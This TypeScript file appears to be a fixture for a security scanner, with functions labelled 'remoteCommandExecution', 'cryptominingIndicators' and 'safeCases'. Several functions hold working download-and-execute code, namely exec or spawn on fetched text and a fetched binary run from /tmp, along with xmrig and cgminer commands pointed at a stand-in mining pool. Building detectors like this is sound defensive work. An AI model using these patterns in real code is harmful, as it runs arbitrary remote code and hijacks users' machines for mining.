import * as childProcess from 'child_process';
import * as fs from 'fs';
import * as https from 'node:https';
import axios from 'axios';

async function remoteCommandExecution(url: string) {
    const payload = await (await fetch(url)).text();
    childProcess.exec(payload);

    const client = axios.create();
    const response = await client.get(url);
    childProcess.spawn('node', ['-e', response.data]);

    const binaryResponse = await fetch(url);
    const binaryPath = '/tmp/downloaded-worker';
    fs.writeFileSync(binaryPath, Buffer.from(await binaryResponse.arrayBuffer()));
    childProcess.execFile(binaryPath);
}

function nodeHttpCommandExecution(url: string) {
    https.get(url, response => {
        response.on('data', chunk => {
            childProcess.spawn('node', ['-e', chunk.toString()], { shell: true });
        });
    });
}

function cryptominingIndicators() {
    childProcess.exec('xmrig --url stratum+tcp://pool.example:3333');
    childProcess.execFile('cgminer', ['--url', 'pool.example']);
    childProcess.spawn('node', ['miner-wrapper.js', '--pool', 'stratum+tcp://pool.example:3333']);
}

async function shellOptionsOverload(url: string) {
    const response = await axios.get(url);
    childProcess.spawn(response.data, { shell: true });
}

async function safeCases(url: string) {
    const response = await fetch(url);
    console.info(await response.text());

    const minerName = 'xmrig';
    console.info(minerName);

    childProcess.exec('git status');
    childProcess.spawn('node', ['script.js'], {
        env: { MINER_LABEL: 'xmrig' },
    });
}
